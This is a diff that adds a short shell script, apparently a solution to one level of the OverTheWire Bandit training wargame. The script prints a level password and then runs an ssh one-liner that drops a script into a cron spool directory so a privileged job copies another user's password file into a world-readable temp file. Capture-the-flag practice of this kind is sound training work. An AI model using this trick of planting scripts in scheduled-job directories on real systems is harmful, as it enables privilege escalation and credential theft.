@@ -1,0 +1,3 @@
+echo Password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+echo Please wait... (60 sec) 
+ssh bandit23@bandit.labs.overthewire.org -p2220 'touch /tmp/p24; chmod 666 /tmp/p24; echo "cat /etc/bandit_pass/bandit24 > /tmp/p24" > /var/spool/bandit24/key.sh; chmod +777 /var/spool/bandit24/key.sh; sleep 60; cat /tmp/p24'
